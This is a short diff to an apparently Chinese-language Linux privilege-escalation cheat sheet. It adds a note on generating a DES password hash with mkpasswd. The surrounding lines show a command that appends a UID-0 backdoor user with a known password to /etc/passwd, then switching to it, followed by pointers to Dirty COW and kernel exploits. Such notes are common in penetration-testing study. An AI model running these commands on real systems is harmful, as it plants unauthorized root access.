@@ -56,6 +56,7 @@
 	- 写入：echo 'Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash' >> /etc/passwd
 	- 密码为：Password@973
 	- su Tom
+	- mkpasswd -m des生成用户密码。
 - 脏牛漏洞本地提权
 - 内核漏洞利用
     - searchspolit linux
